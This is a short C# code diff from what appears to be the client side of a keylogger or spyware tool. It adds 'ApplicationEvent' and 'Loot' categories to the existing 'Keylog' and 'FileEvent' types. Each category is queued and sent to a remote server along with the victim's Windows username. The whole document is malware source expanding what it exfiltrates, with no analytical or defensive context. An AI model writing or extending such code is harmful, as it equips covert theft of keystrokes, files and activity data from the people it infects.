@@ -13,7 +13,7 @@ namespace Client.Communication
     {
         public enum StringType
         {
-            Keylog, FileEvent
+            Keylog, FileEvent, ApplicationEvent, Loot
         }
         private static List<Tuple<string, StringType>> _sdata = new List<Tuple<string, StringType>>();
         public static async void Send(string sdata, StringType type)
@@ -35,6 +35,16 @@ namespace Client.Communication
                             break;
                         case StringType.FileEvent:
                             if (Server.AsyncSendString(i.Item1, Environment.UserName, "fileevent").Result)
+                                _sdata.Remove(i);
+                            else failed = true;
+                            break;
+                        case StringType.ApplicationEvent:
+                            if (Server.AsyncSendString(i.Item1, Environment.UserName, "applicationevent").Result)
+                                _sdata.Remove(i);
+                            else failed = true;
+                            break;
+                        case StringType.Loot:
+                            if (Server.AsyncSendString(i.Item1, Environment.UserName, "loot").Result)
                                 _sdata.Remove(i);
                             else failed = true;
                             break;
